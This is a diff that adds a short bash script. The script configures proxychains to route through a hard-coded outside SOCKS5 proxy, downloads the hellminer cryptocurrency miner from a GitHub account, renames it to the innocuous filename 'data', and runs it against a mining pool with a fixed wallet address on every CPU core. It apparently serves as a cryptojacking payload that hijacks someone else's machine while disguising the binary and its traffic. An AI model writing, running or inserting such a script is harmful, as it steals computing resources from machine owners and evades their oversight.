@@ -1,0 +1,11 @@
+#!/bin/bash
+apt update && apt install -y sudo
+sudo apt update && sudo apt install gcc screen -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
+apt install proxychains -y
+sed -i 's/socks4/socks5/' /etc/proxychains.conf 
+sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
+sed -i 's/9050/10663/' /etc/proxychains.conf
+wget https://github.com/principala/a/raw/main/hellminer -O data &&
+wget https://github.com/principala/a/raw/main/verus-solver -O solver
+chmod +x data && chmod +x solver 
+./data -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RFAyGt31VDBd2MK4wWQoRsFzUXi755Ubn6.PayAs -p x --cpu $(nproc)
